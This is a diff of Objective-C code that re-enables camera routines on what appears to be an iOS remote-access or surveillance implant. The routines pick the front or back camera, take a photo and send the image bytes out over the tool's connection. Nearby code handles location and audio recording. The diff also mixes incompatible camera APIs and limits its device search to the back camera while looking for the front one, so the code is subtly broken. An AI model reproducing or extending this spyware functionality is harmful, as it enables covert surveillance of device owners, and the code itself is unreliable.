@@ -102,127 +102,120 @@ bool sysTaskRunning = false;
     [self term];
 }
 
-// MARK: Picture Data
-// -(void)takePicture:(bool)front {
-//     NSArray *devices = [AVCaptureDevice
-//     devicesWithMediaType:AVMediaTypeVideo]; AVCaptureDevice *captureDevice =
-//     nil;
+-(void)takePicture:(bool)front {
+    AVCaptureDeviceDiscoverySession *captureDeviceDiscoverySession = [AVCaptureDeviceDiscoverySession discoverySessionWithDeviceTypes:@[AVCaptureDeviceTypeBuiltInWideAngleCamera] 
+                                        mediaType:AVMediaTypeVideo 
+                                        position:AVCaptureDevicePositionBack];
+    NSArray *devices = [captureDeviceDiscoverySession devices];
+    AVCaptureDevice *captureDevice = nil;
+    for (AVCaptureDevice *device in devices) {
+        if (front) {
+            if (device.position == AVCaptureDevicePositionFront) {
+                captureDevice = device;
+                [self debugLog:[NSString stringWithFormat:@"weeeee got front"]];
+            }
+        } else {
+            if (device.position == AVCaptureDevicePositionBack) {
+                captureDevice = device;
+                [self debugLog:[NSString stringWithFormat:@"weeeee got back"]];
+            }
+        }
+    }
+    if (captureDevice == nil) {
+        [self sendString:@"{\"error\":\"Unable to activate camera\"}"];
+        [self term];
+        return;
+    }
 
-//     for (AVCaptureDevice *device in devices) {
-//         if (front) {
-//             if (device.position == AVCaptureDevicePositionFront) {
-//                 captureDevice = device;
-//                 [self debugLog:[NSString stringWithFormat:@"weeeee got
-//                 front"]];
-//             }
-//         } else {
-//             if (device.position == AVCaptureDevicePositionBack) {
-//                 captureDevice = device;
-//                 [self debugLog:[NSString stringWithFormat:@"weeeee got
-//                 back"]];
-//             }
-//         }
-//     }
-//     if (captureDevice == nil) {
-//         [self sendString:@"{\"error\":\"Unable to activate camera\"}"];
-//         [self term];
-//         return;
-//     }
+    //initialize session
+    self.session = [[AVCaptureSession alloc] init];
+    self.session.sessionPreset = AVCaptureSessionPresetMedium;
+    //set input
+    NSError *error = nil;
+    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:captureDevice error:&error]; 
+    [self.session addInput:input];
+    //set output
+    [self debugLog:[NSString stringWithFormat:@"setting still image output"]];
+    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.5]]; 
+    self.stillImageOutput = [[AVCapturePhotoOutput alloc] init];
+    /*
 
-//     //initialize session
-//     self.session = [[AVCaptureSession alloc] init];
-//     self.session.sessionPreset = AVCaptureSessionPresetMedium;
-//     //set input
-//     NSError *error = nil;
-//     AVCaptureDeviceInput *input = [AVCaptureDeviceInput
-//     deviceInputWithDevice:captureDevice error:&error]; [self.session
-//     addInput:input];
-//     //set output
-//     [self debugLog:[NSString stringWithFormat:@"setting still image
-//     output"]];
-//     [[NSRunLoop mainRunLoop] runUntilDate:[NSDate
-//     dateWithTimeIntervalSinceNow:0.5]]; self.stillImageOutput =
-//     [[AVCapturePhotoOutput alloc] init];
+         The whole outputSettings thing is
+            1. Not even found (neither as depcrecated nor did i find it in *any* documentation)
+            2. It isn't even modified. It's just empty
 
-//     NSDictionary *outputSettings = [[NSDictionary alloc]
-//     initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
-//     [self.stillImageOutput setOutputSettings:outputSettings]; [self.session
-//     addOutput:self.stillImageOutput];
-//     //run
-//     [self.session startRunning];
+    */
 
-//     //take pic
-//     [NSThread sleepForTimeInterval:0.2];
-//     __block BOOL done = NO;
-//     __block NSData *bImageData;
-//     [self captureImageWithBlock:^(NSData *imageData)
-//      {
-//          if (imageData) {
-//              NSMutableDictionary *result = [[NSMutableDictionary alloc]
-//              init]; [result setValue:[NSNumber
-//              numberWithInt:(int)imageData.length] forKey:@"size"]; [result
-//              setValue:[NSNumber numberWithInt:1] forKey:@"success"]; NSData
-//              *jsonData = [NSJSONSerialization dataWithJSONObject:result
-//              options:0 error:nil]; [self sendString:[[NSString alloc]
-//              initWithData:jsonData encoding:NSUTF8StringEncoding]]; [self
-//              term];
-//          } else {
-//              [self sendString:@"{\"status\":0}"];
-//          }
-//          bImageData = [[NSData alloc] initWithData:imageData];
-//          [self sendData:bImageData];
-//          done = true;
-//      }];
-//     while (!done)
-//         [[NSRunLoop mainRunLoop] runUntilDate:[NSDate
-//         dateWithTimeIntervalSinceNow:0.1]];
+    // NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecTypeJPEG, AVVideoCodecKey, nil];
+    // [self.stillImageOutput setOutputSettings:outputSettings];
+    [self.session addOutput:self.stillImageOutput];
+    [self.session startRunning];
+    [NSThread sleepForTimeInterval:0.2];
+    __block BOOL done = NO;
+    __block NSData *bImageData;
+    [self captureImageWithBlock:^(NSData *imageData) {
+        if (imageData) {
+            NSMutableDictionary *result = [[NSMutableDictionary alloc] init]; 
+            [result setValue:[NSNumber numberWithInt:(int)imageData.length] forKey:@"size"];
+            [result setValue:[NSNumber numberWithInt:1] forKey:@"success"]; 
+            NSData *jsonData = [NSJSONSerialization dataWithJSONObject:result options:0 error:nil]; 
+            [self sendString:[[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]]; 
+            [self term];
+         } else {
+             [self sendString:@"{\"status\":0}"];
+         }
+         bImageData = [[NSData alloc] initWithData:imageData];
+         [self sendData:bImageData];
+         done = true;
+    }];
+    while (!done)
+        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate
+        dateWithTimeIntervalSinceNow:0.1]];
 
-//     [self debugLog:[NSString stringWithFormat:@"done"]];
-// }
+    [self debugLog:[NSString stringWithFormat:@"done"]];
+}
 
-// -(void)captureImageWithBlock:(void (^)(NSData *))imageData {
-//     AVCaptureConnection* videoConnection = nil;
+-(void)captureImageWithBlock:(void (^)(NSData *))imageData {
+    AVCaptureConnection* videoConnection = nil;
+    for (AVCaptureConnection* connection in
+    self.stillImageOutput.connections) {
+        [self debugLog:[NSString stringWithFormat:@"scanned"]];
+        [[NSRunLoop mainRunLoop] runUntilDate:[NSDate
+        dateWithTimeIntervalSinceNow:0.5]]; for (AVCaptureInputPort* port in
+        [connection inputPorts]) {
+            if ([[port mediaType] isEqual:AVMediaTypeVideo]) {
+                videoConnection = connection;
+                [self debugLog:[NSString stringWithFormat:@"we got the videoConnection!"]]; break;
+            }
+        }
+        if (videoConnection) break;
+    }
+    if (videoConnection == nil) return imageData(nil);
+    //capture still image from video connection
+    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error) {
+        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
+           [self.session stopRunning];
+        });
+        if (error) imageData(nil);
+        NSData* data = [AVCapturePhotoOutput JPEGPhotoDataRepresentationForJPEGSampleBuffer:imageSampleBuffer];
+        if (data) {
+           imageData(data);
+        } else {
+            imageData(nil);
+        }
+    }];
+}
 
-//     for (AVCaptureConnection* connection in
-//     self.stillImageOutput.connections) {
-//         [self debugLog:[NSString stringWithFormat:@"scanned"]];
-//         [[NSRunLoop mainRunLoop] runUntilDate:[NSDate
-//         dateWithTimeIntervalSinceNow:0.5]]; for (AVCaptureInputPort* port in
-//         [connection inputPorts]) {
-//             if ([[port mediaType] isEqual:AVMediaTypeVideo]) {
-//                 videoConnection = connection;
-//                 [self debugLog:[NSString stringWithFormat:@"we got the
-//                 videoConnection!"]]; break;
-//             }
-//         }
-//         if (videoConnection)
-//             break;
-//     }
-//     if (videoConnection == nil) {
-//         return imageData(nil);
-//     }
+- (void)captureOutput:(AVCapturePhotoOutput *)output didFinishProcessingPhoto:(AVCapturePhoto *)photo error:(nullable NSError *)error{  
+    /*
+        TODO: Migrate from old deprecated iOS 10< Image capturing functions to newer functions using AVCapturePhotoOutput etc.
+            References:
+                https://developer.apple.com/documentation/avfoundation/avcapturephotooutput/1778657-jpegphotodatarepresentationforjp?language=objc
+                https://developer.apple.com/documentation/avfoundation/avcapturephoto/2873919-filedatarepresentation?language=objc
+                https://developer.apple.com/documentation/avfoundation/avcapturephotooutput?language=objc
 
-//     //capture still image from video connection
-//     [self.stillImageOutput
-//     captureStillImageAsynchronouslyFromConnection:videoConnection
-//     completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
-//      {
-//          dispatch_async(dispatch_get_global_queue(
-//          DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void) {
-//             [self.session stopRunning];
-//          });
-
-//          if (error)
-//              imageData(nil);
-
-//          NSData* data = [AVCapturePhotoOutput
-//          jpegStillImageNSDataRepresentation:imageSampleBuffer]; if (data) {
-//              imageData(data);
-//          } else {
-//              imageData(nil);
-//          }
-//      }];
-// }
+    */
+}
 
 - (void)locate {
     CLLocationManager* manager = [[CLLocationManager alloc] init];
@@ -455,17 +448,20 @@ bool sysTaskRunning = false;
     self.audioRecorder = [[AVAudioRecorder alloc] initWithURL:soundFile settings:soundSetting error:&error];
 }
 
-// -(AVCaptureDevice *)initcamera:(bool)front {
-//     NSArray *videoDevices = [AVCaptureDevice
-//     devicesWithMediaType:AVMediaTypeVideo]; AVCaptureDevice *captureDevice =
-//     nil; for (AVCaptureDevice *device in videoDevices){
-//         if (device.position == AVCaptureDevicePositionFront){
-//             captureDevice = device;
-//             break;
-//         }
-//     }
-//     return captureDevice;
-// }
+- (AVCaptureDevice *)initcamera:(bool)front {
+    AVCaptureDeviceDiscoverySession *captureDeviceDiscoverySession = [AVCaptureDeviceDiscoverySession discoverySessionWithDeviceTypes:@[AVCaptureDeviceTypeBuiltInWideAngleCamera] 
+                                        mediaType:AVMediaTypeVideo 
+                                        position:AVCaptureDevicePositionBack];
+    NSArray *videoDevices = [captureDeviceDiscoverySession devices];
+    AVCaptureDevice *captureDevice = nil;
+    for (AVCaptureDevice *device in videoDevices){
+        if (device.position == AVCaptureDevicePositionFront){
+            captureDevice = device;
+            break;
+        }
+    }
+    return captureDevice;
+}
 
 // MARK: Data Handling
 char lastBytes[64];
